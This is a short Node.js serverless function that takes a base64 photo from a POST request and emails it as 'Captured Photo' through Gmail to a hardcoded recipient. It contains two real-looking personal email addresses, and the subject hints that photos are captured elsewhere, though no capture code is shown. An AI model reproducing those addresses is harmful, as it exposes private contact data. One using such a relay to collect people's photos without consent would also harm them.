const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

// Email transport configuration
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'aleksadiscord1@gmail.com',  // Sender email
    pass: process.env.GMAIL_APP_PASSWORD,  // Gmail App Password (use environment variable for security)
  },
});

module.exports = async (req, res) => {
  if (req.method === 'POST') {
    const { photo } = req.body;

    if (!photo) {
      return res.status(400).json({ success: false, message: 'No photo data received' });
    }

    // Decode the base64 photo string
    const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
    const filePath = path.join('/tmp', 'photo.jpg');  // Vercel uses the /tmp directory for temporary files

    try {
      // Save the photo as a JPEG file
      fs.writeFileSync(filePath, base64Data, 'base64');

      // Create the email options
      const mailOptions = {
        from: 'aleksadiscord1@gmail.com',
        to: 'aleksi.tomic.2008@gmail.com',  // Receiver email
        subject: 'Captured Photo',
        text: 'Here is the captured photo.',
        attachments: [
          {
            filename: 'photo.jpg',
            path: filePath,
          },
        ],
      };

      // Send the email with the photo as an attachment
      await transporter.sendMail(mailOptions);

      // Clean up the saved photo after sending email
      fs.unlinkSync(filePath);

      res.status(200).json({ success: true, message: 'Photo sent successfully!' });
    } catch (error) {
      console.error('Error:', error);
      res.status(500).json({ success: false, message: 'Error processing photo and sending email' });
    }
  } else {
    res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }
};
